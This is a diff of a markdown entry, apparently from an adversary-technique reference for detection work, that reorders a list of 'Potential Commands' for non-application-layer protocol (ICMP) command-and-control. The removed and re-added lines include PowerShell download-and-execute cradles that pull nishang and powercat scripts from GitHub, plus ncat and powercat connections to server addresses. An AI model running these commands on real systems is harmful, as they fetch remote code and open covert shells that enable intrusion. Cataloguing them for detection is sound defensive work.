@@ -29,23 +29,16 @@ ICMP communication between hosts is one example. Because ICMP is part of the Int
 ## Potential Commands
 
 ```
-IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
-Invoke-PowerShellIcmp -IPAddress 127.0.0.1
-
-cmd /c #{ncat_exe} #{server_ip} 80
-
-cmd /c $env:TEMP\T1095\nmap-7.80\ncat.exe #{server_ip} #{server_port}
-
-cmd /c #{ncat_exe} #{server_ip} #{server_port}
-
 cmd /c #{ncat_exe} 127.0.0.1 #{server_port}
-
+cmd /c $env:TEMP\T1095\nmap-7.80\ncat.exe #{server_ip} #{server_port}
+cmd /c #{ncat_exe} #{server_ip} #{server_port}
 IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
 powercat -c 127.0.0.1 -p #{server_port}
-
 IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
 powercat -c #{server_ip} -p 80
-
+IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
+Invoke-PowerShellIcmp -IPAddress 127.0.0.1
+cmd /c #{ncat_exe} #{server_ip} 80
 ```
 
 ## Commands Dataset
